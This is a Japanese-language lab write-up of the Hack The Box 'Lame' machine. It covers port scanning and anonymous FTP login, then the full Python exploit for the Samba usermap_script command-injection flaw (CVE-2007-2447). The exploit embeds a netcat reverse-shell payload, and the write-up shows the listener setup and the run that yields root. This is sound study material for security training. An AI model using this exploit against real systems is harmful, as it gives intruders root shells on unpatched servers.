# Lame

* サーバー接続確認

```bash
ping 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=677 ms
64 bytes from 10.10.10.3: icmp_seq=2 ttl=63 time=189 ms
```

* nmapコマンド実行

```bash
$ nmap -Pn 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 15:01 JST
Nmap scan report for 10.10.10.3
Host is up (0.19s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

* -Pnオプション：　Treate all hosts as online

* ftpでanonymousログインしてみる(パスワードなし)

  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ ftp 10.10.10.3                                                          
  Connected to 10.10.10.3.
  220 (vsFTPd 2.3.4)
  Name (10.10.10.3:kali): anonymous
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  
  ```

​		→ログイン成功

* sshコマンド(root)

  ```bash
  ssh root@10.10.10.3
  Unable to negotiate with 10.10.10.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
  ```

* 公開鍵をftpで送付したい

  →わからずここでwriteupへ（結局fptはanonymousでログインできるもののftpサーバーのカレントディレクトリに何もなくかつディレクトリ移動もできないため脆弱性がなかった）

以降Writeupに従って実施

* [参考サイト-metasploit使っている](https://infosecwriteups.com/htb-lame-writeup-e47100aea88b)

* [参考サイト-metasploit使っていない](https://medium.com/@nmappn/lame-hack-the-box-without-metasploit-1b3a138f9206)

* nmap実施

  ```bash
  sudo nmap -sC -sV -p-  10.10.10.3 
  
  Not shown: 996 filtered tcp ports (no-response)
  PORT     STATE SERVICE     VERSION
  21/tcp   open  ftp         vsftpd 2.3.4
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to 10.10.14.5
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      vsFTPd 2.3.4 - secure, fast, stable
  |_End of status
  22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
  |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
  3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  | smb-security-mode: 
  |   account_used: <blank>
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  |_smb2-time: Protocol negotiation failed (SMB2)
  | smb-os-discovery: 
  |   OS: Unix (Samba 3.0.20-Debian)
  |   Computer name: lame
  |   NetBIOS computer name: 
  |   Domain name: hackthebox.gr
  |   FQDN: lame.hackthebox.gr
  |_  System time: 2022-07-05T05:19:17-04:00
  |_clock-skew: mean: 1h58m17s, deviation: 2h49m43s, median: -1m43s
  
  
  
  ```
  
  * -sCオプション：--script=defaultと同様のオプション。defaultはNSEスクリプトを選択せずに行うスキャン
  * -sVオプション：サービスバージョンスキャン
  * -p-オプション：1024以降のポートも検索する

* Sambaの脆弱性確認

  ```
  searchsploit Samba 3.0.20
  ----------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                          |  Path
  ------------------------------------------------------------------------ ---------------------------------
  Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                  | multiple/remote/10095.txt
  Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Me | unix/remote/16320.rb
  Samba < 3.0.20 - Remote Heap Overflow                                   | linux/remote/7701.txt
  Samba < 3.0.20 - Remote Heap Overflow                                   | linux/remote/7701.txt
  Samba < 3.6.2 (x86) - Denial of Service (PoC)                           | linux_x86/dos/36741.py
  ------------------------------------------------------------------------ ---------------------------------
  Shellcodes: No Results
  
  ```

  * Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution とはどのような脆弱性か
    * [参考サイト](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/)
    * CVE-2007-2447
    * リモートコマンドインジェクション
    * ユーザネームにshell meta charactersを含む場合、任意のコマンドを実行できてしまう脆弱性

* pythonコードがあるので実行を試す

  * [サンプルコード](https://github.com/amriunix/CVE-2007-2447)

  * ディレクトリの作成

    ```bash
    mkdir Documents/HTB
    mkdir Documents/HTB/Lame
    ```

  * pyenvのインストール（説明は割愛）

    ```bash
    ┌──(kali㉿kali)-[/home]
    └─$ pyenv -v                                                                                              
    pyenv 2.3.2-1-g207f33fc
    
    ┌──(kali㉿kali)-[~/Documents/HTB/Lame]
    └─$ pyenv local 3.8.5                                                                
    
    ┌──(kali㉿kali)-[~/Documents/HTB/Lame]
    └─$ pyenv versions                                                                   
      system
    * 3.8.5 (set by /home/kali/Documents/HTB/Lame/.python-version)
    ```

  * pypoetryのインストール（説明は割愛）

    ```bash
    ┌──(kali㉿kali)-[~/Documents/HTB/Lame]
    └─$ poetry init
    └─$ poetry add pysmb
    ```
  
  * pythonコードのclone
  
    ```bash
    git clone https://github.com/amriunix/CVE-2007-2447.git 
    poetry shell 
    cd CVE-2007-2447/
    
    ```
  
  * usermap_script.py
  
    ```python
    import sys
    from smb.SMBConnection import SMBConnection
    
    def exploit(rhost, rport, lhost, lport):
            payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
            username = "/=`nohup " + payload + "`"
            conn = SMBConnection(username, "", "", "")
            try:
                conn.connect(rhost, int(rport), timeout=1)
            except:
                print("[+] Payload was sent - check netcat !")
    
    if __name__ == '__main__':
        print("[*] CVE-2007-2447 - Samba usermap script")
        if len(sys.argv) != 5:
            print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
        else:
            print("[+] Connecting !")
            rhost = sys.argv[1]
            rport = sys.argv[2]
            lhost = sys.argv[3]
            lport = sys.argv[4]
            exploit(rhost, rport, lhost, lport)
    ```
  
    * mkfifoコマンド：[名前付きパイプ](https://qiita.com/richmikan@github/items/bb660a58690ac01ec295)
    * nc lhost lport /bin/sh をしている

* usermap_script.pyでLHOSTに対してリバースシェルを実行している。

  * タブ1つ目

    ```bash
    # 4444ポートで待ち受けを実施する
    nc -lvp 4444
    ```

  * タブ2つ目

    ```bash
    ┌──(lame-pB_69G5l-py3.8)(kali㉿kali)-[~/Documents/HTB/Lame/CVE-2007-2447]
    └─$ python usermap_script.py 10.10.10.3 139 10.10.14.5 4444        
    [*] CVE-2007-2447 - Samba usermap script
    [+] Connecting !
    [+] Payload was sent - check netcat !
    
    ```

    これでroot.txtとuser.txtの取得ができる。rootでのリバースシェルだったため。

## 所感

* nmapは、適切にオプションを付けて実行すること。-sVと-p-はつけるようにしたい。

* sploitsearchは、OSCPでも禁止されていなさそうなので積極的に使っていきたい。まずは脆弱性を見つけられるかどうか。そこが大事なポイントだと感じた。

* metasploitを使わずにPoCをインストールして実行できたのが良かった。pythonだったからという点が多分にあるので、その他言語でもPoC実行できるように環境構築手順をまとめておきたい。

  
